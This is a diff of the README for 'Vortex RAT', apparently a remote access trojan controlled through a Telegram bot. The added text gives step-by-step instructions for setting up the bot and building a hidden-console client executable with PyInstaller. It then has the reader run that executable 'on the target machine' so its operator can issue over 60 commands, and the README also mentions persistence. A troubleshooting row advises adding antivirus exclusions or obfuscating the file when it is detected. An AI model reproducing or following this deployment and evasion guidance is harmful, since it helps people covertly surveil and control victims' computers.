@@ -2,7 +2,7 @@
 
 # ⚡ Vortex RAT
 
-### Remote Administration Tool via Telegram
+### Advanced Remote Administration Tool via Telegram
 
 [![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
 [![Telegram](https://img.shields.io/badge/Telegram-Bot%20API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org/bots)
@@ -28,31 +28,70 @@
 
 ## 🚀 Quick Start
 
-### Prerequisites
-- **Python 3.8+** installed on the build machine
-- **PyInstaller** — `pip install pyinstaller`
+### Step 1 — Install Python
 
-### Setup
+Download and install **Python 3.8+** from [python.org](https://www.python.org/downloads/)
 
-**1. Create a Telegram Bot**
-- Open Telegram → search **@BotFather** → send `/newbot`
-- Follow the prompts and copy the **Bot Token**
+> ⚠️ **IMPORTANT:** During installation, check ✅ **"Add Python to PATH"**
 
-**2. Get Your User ID**
-- Search **@userinfobot** on Telegram → send `/start`
-- Note your numeric **User ID**
+### Step 2 — Clone the Repository
 
-**3. Build the Client**
-- Run `Vortex RAT Builder.exe`
-- Paste your **Bot Token** and **User ID**
-- Customize the exe name, icon, and admin mode
-- Click **⚡ BUILD EXECUTABLE**
-- The client `.exe` appears in the `output/` folder
+```bash
+git clone https://github.com/YourUsername/Vortex-Advance-RAT.git
+cd Vortex-Advance-RAT
+```
 
-**4. Deploy**
-- Run the client `.exe` on the target machine
-- You'll receive an automatic notification on Telegram
-- Send `/help` to see all available commands
+### Step 3 — Install Dependencies
+
+```bash
+pip install -r requirements.txt
+```
+
+### Step 4 — Create a Telegram Bot
+
+1. Open Telegram → search **@BotFather** → send `/newbot`
+2. Follow the prompts, give your bot a name and username
+3. Copy the **Bot Token** (e.g., `8551779985:AAFxIsKFSSviwldBGhk-oeqRlYSrmIV-xxx`)
+
+### Step 5 — Get Your User ID
+
+1. Search **@userinfobot** on Telegram → send `/start`
+2. Note your numeric **User ID** (e.g., `8310686102`)
+
+### Step 6 — Run the Builder
+
+```bash
+python builder.py
+```
+
+This opens the **Vortex RAT Builder** GUI:
+
+1. Click the **🔨 Builder** tab
+2. Paste your **Bot Token** and **User ID**
+3. Customize the executable name, icon, and admin mode
+4. Click **⚡ BUILD EXECUTABLE**
+5. Wait 1-2 minutes — the client `.exe` appears in the `output/` folder
+
+### Step 7 — Deploy & Connect
+
+1. Run the built `.exe` on the target machine
+2. You'll receive an automatic notification on Telegram
+3. Send `/help` to see all 60+ available commands
+
+---
+
+## 🔨 Build Your Own Builder (Optional)
+
+Want a standalone Builder `.exe` you can run without Python?
+
+```bash
+pip install pyinstaller
+python -m PyInstaller --onefile --noconsole --clean --name "Vortex RAT Builder" --icon "rat.ico" --add-data "client.py;." --add-data "rat.ico;." builder.py
+```
+
+Your standalone builder will be in the `dist/` folder.
+
+> **Note:** Even after compiling the builder, the machine running it still needs Python installed to compile client executables (PyInstaller requires Python).
 
 ---
 
@@ -200,15 +239,13 @@ Remove all persistence with `/rmstartup`.
 ## 🏗️ Project Structure
 
 ```
-Vortex RAT/
-├── Vortex RAT Builder.exe   # Standalone builder (run this)
-├── builder.py                # Builder source code
-├── client.py                 # Client source code (bundled in builder)
-├── image.png                 # Donate QR code (bundled in builder)
-├── favicon (4).ico           # Builder icon
-├── requirements.txt          # Python dependencies
-├── output/                   # Built client executables go here
-└── README.md
+Vortex-Advance-RAT/
+├── builder.py           # Builder source code (run this)
+├── client.py            # Client template (auto-bundled by builder)
+├── rat.ico              # Builder icon
+├── requirements.txt     # Python dependencies
+├── README.md            # This file
+└── output/              # Built client executables go here
 ```
 
 ---
@@ -222,7 +259,23 @@ pyinstaller         psutil       pycaw        comtypes
 pyaudio             keyboard     pycryptodome
 ```
 
-Install all: `pip install -r requirements.txt`
+Install all at once:
+```bash
+pip install -r requirements.txt
+```
+
+---
+
+## ❓ Troubleshooting
+
+| Problem | Solution |
+|---------|----------|
+| `python` not recognized | Reinstall Python with ✅ "Add to PATH" checked |
+| `pip` not found | Run `python -m ensurepip --upgrade` |
+| Build fails with module errors | Run `pip install -r requirements.txt` |
+| `pyaudio` fails to install | Download `.whl` from [here](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio) |
+| Client shows console window | Builder already uses `--noconsole` flag |
+| AV detects the exe | Add exclusion or use obfuscation |
 
 ---
 
@@ -236,5 +289,7 @@ Install all: `pip install -r requirements.txt`
 <div align="center">
 
 **Made with ❤️ by Vortex**
+
+⭐ Star this repo if you found it useful!
 
 </div>
